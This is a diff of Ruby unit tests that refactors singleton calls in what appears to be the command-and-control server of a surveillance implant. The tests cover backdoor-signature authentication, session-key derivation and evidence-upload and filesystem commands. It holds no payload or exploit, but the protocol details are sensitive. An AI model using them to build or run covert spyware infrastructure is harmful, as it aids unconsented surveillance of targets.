@@ -65,7 +65,7 @@ class TestProtocol < Test::Unit::TestCase
 
     # fake message inside the crypt
     message = "test fake message to fuzzy the protocol".ljust(104, "\x00")
-    message = aes_encrypt(message, DB.instance.backdoor_signature)
+    message = aes_encrypt(message, DB.backdoor_signature)
     content, type, cookie = Protocol.authenticate('test-peer', 'test-uri', message)
     assert_nil content
   end
@@ -77,9 +77,9 @@ class TestProtocol < Test::Unit::TestCase
     build = "RCS_BUILD-TEST".ljust(16, "\x00")
     instance = "\x03" * 20
     type = "TEST".ljust(16, "\x00")
-    sha = Digest::SHA1.digest(build + instance + type + DB.instance.class_key_of('RCS_BUILD-TEST'))
+    sha = Digest::SHA1.digest(build + instance + type + DB.class_key_of('RCS_BUILD-TEST'))
     message = kd + nonce + build + instance + type + sha
-    message = aes_encrypt(message, DB.instance.backdoor_signature)
+    message = aes_encrypt(message, DB.backdoor_signature)
 
     content, type, cookie = Protocol.authenticate('test-peer', 'test-uri', message)
 
@@ -88,10 +88,10 @@ class TestProtocol < Test::Unit::TestCase
 
     # [ Crypt_C ( Ks ), Crypt_K ( NonceDevice, Response ) ]
     assert_equal 64, content.length
-    ks = aes_decrypt(content.slice!(0..31), DB.instance.backdoor_signature)
+    ks = aes_decrypt(content.slice!(0..31), DB.backdoor_signature)
     # calculate the session key ->  K = sha1(Cb || Ks || Kd)
     # we use a schema like PBKDF1
-    k = Digest::SHA1.digest(DB.instance.class_key_of('RCS_BUILD-TEST') + ks + kd)
+    k = Digest::SHA1.digest(DB.class_key_of('RCS_BUILD-TEST') + ks + kd)
     snonce = aes_decrypt(content, k)
 
     # check if the nonce is equal in the response
@@ -103,7 +103,7 @@ class TestProtocol < Test::Unit::TestCase
   def test_ident
     # stub the fake session (pretending auth was performed)
     key = Digest::SHA1.digest 'test-key'
-    cookie = SessionManager.instance.create(0, "test-build", "test-instance", "test-subtype", key)
+    cookie = SessionManager.create(0, "test-build", "test-instance", "test-subtype", key)
 
     # prepare the command
     message = [Commands::PROTO_ID].pack('I')
@@ -126,7 +126,7 @@ class TestProtocol < Test::Unit::TestCase
   def test_bye
     # stub the fake session (pretending auth was performed)
     key = Digest::SHA1.digest 'test-key'
-    cookie = SessionManager.instance.create(0, "test-build", "test-instance", "test-subtype", key)
+    cookie = SessionManager.create(0, "test-build", "test-instance", "test-subtype", key)
 
     # check that the session is valid (after the bye must be invalid)
     assert_true Protocol.valid_authentication('test-peer', cookie)
@@ -153,7 +153,7 @@ class TestProtocol < Test::Unit::TestCase
   def test_commands
     # stub the fake session (pretending auth was performed)
     key = Digest::SHA1.digest 'test-key'
-    cookie = SessionManager.instance.create(0, "test-build", "test-instance", "test-subtype", key)
+    cookie = SessionManager.create(0, "test-build", "test-instance", "test-subtype", key)
 
     # all the commands
     commands = [Commands::PROTO_CONF, Commands::PROTO_UPLOAD, Commands::PROTO_UPGRADE, Commands::PROTO_DOWNLOAD, Commands::PROTO_FILESYSTEM]
@@ -173,7 +173,7 @@ class TestProtocol < Test::Unit::TestCase
   def test_evidence
     # stub the fake session (pretending auth was performed)
     key = Digest::SHA1.digest 'test-key'
-    cookie = SessionManager.instance.create(0, "test-build", "test-instance", "test-subtype", key)
+    cookie = SessionManager.create(0, "test-build", "test-instance", "test-subtype", key)
 
     evidence = 'test-evidence'
     message = [Commands::PROTO_EVIDENCE].pack('I') + [evidence.length].pack('I') + evidence
